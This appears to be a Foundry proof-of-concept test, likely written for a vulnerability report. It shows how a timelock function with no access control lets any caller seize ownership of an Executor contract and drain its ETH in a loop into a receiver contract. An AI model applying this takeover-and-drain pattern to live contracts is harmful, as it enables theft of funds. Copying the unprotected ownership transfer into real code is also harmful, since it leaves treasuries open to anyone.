// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {Executor} from "contracts/Executor.sol";
import {ITimelock} from "contracts/interfaces/ITimelock.sol";
import {ExternalCall} from "contracts/libraries/ExternalCalls.sol";
import {Duration} from "contracts/types/Duration.sol";

/**
 * @notice Mock Timelock with no access control (vulnerable scenario)
 */
contract VulnerableTimelock is ITimelock {
    function transferExecutorOwnership(address executor, address newOwner) external override {
        console.log("[Timelock] transferExecutorOwnership called by:", msg.sender);
        console.log("[Timelock] Attempting to set new Executor owner to:", newOwner);
        Executor(payable(executor)).transferOwnership(newOwner);
        console.log("[Timelock] Ownership successfully transferred to:", newOwner);
    }

    // Dummy implementations for unused interface methods
    function submit(address, ExternalCall[] calldata) external pure override returns (uint256) { return 0; }
    function schedule(uint256) external pure override {}
    function execute(uint256) external pure override {}
    function cancelAllNonExecutedProposals() external pure override {}
    function canSchedule(uint256) external pure override returns (bool) { return true; }
    function canExecute(uint256) external pure override returns (bool) { return true; }
    function getAdminExecutor() external pure override returns (address) { return address(0); }
    function setAdminExecutor(address) external pure override {}
    function getGovernance() external pure override returns (address) { return address(0); }
    function setGovernance(address) external pure override {}
    function getProposal(uint256) external pure override returns (ProposalDetails memory, ExternalCall[] memory) { revert(); }
    function getProposalDetails(uint256) external pure override returns (ProposalDetails memory) { revert(); }
    function getProposalCalls(uint256) external pure override returns (ExternalCall[] memory) { revert(); }
    function getProposalsCount() external pure override returns (uint256) { return 0; }
    function getAfterSubmitDelay() external pure override returns (Duration) { revert(); }
    function getAfterScheduleDelay() external pure override returns (Duration) { revert(); }
    function setAfterSubmitDelay(Duration) external pure override {}
    function setAfterScheduleDelay(Duration) external pure override {}
}

/**
 * @notice PoC: Anyone can take over Executor via unprotected Timelock function
 */
contract TimelockPrivilegeEscalationTest is Test {
    Executor private executor;
    VulnerableTimelock private timelock;
    address private attacker;
    address private attackerContract;

    function setUp() public {
        attacker = vm.addr(1337);

        // Deploy timelock FIRST
        timelock = new VulnerableTimelock();

        // Deploy Executor with timelock as OWNER (production-like setup)
        executor = new Executor(address(timelock));

        // Deploy malicious receiver
        attackerContract = address(new MaliciousReceiver());
    }

    function testExploit_MissingAccessControl() public {
        console.log("\n=== Initial State ===");
        console.log("Executor owner:", executor.owner());
        console.log("Timelock address:", address(timelock));

        // Step 1: Ensure timelock is the current owner
        assertEq(executor.owner(), address(timelock), "Timelock should be the owner");

        // Step 2: Fund Executor with treasury funds
        vm.deal(address(executor), 137 ether); // Random number for realism
        console.log("\n[Funding] Executor funded with", address(executor).balance / 1e18, "ETH");

        // Step 3: Attacker takes ownership instantly (no governance delay)
        console.log("\n=== Privilege Escalation Attempt ===");
        console.log("Attacker address:", attacker);
        vm.startPrank(attacker);
        timelock.transferExecutorOwnership(address(executor), attacker);
        vm.stopPrank();
        console.log("Executor new owner after takeover:", executor.owner());
        assertEq(executor.owner(), attacker, "Attacker did not take ownership");

        // Step 4: Iterative draining until nothing remains
        console.log("\n=== Fund Drain Stage (Iterative) ===");
        uint256 iteration = 0;
        vm.startPrank(attacker);
        while (address(executor).balance > 0) {
            iteration++;
            uint256 stealAmount = address(executor).balance >= 10 ether
                ? 10 ether
                : address(executor).balance;

            console.log("[Drain Iteration]");
            console.log("Iteration number:", iteration);
            console.log("Executor bal:", address(executor).balance / 1e18);
            console.log("Stealing:", stealAmount / 1e18);
            executor.execute(attackerContract, stealAmount, "");
        }
        vm.stopPrank();

        // Step 5: Validate theft
        console.log("\n=== Final State ===");
        console.log("Executor balance after drain:", address(executor).balance / 1e18, "ETH");
        console.log("AttackerContract balance after drain:", address(attackerContract).balance / 1e18, "ETH");

        assertEq(address(executor).balance, 0 ether, "Executor still holds ETH");
        assertEq(address(attackerContract).balance, 137 ether, "Funds not fully drained");
    }
}

/**
 * @notice Malicious receiver to accept stolen ETH
 */
contract MaliciousReceiver {
    receive() external payable {}
}
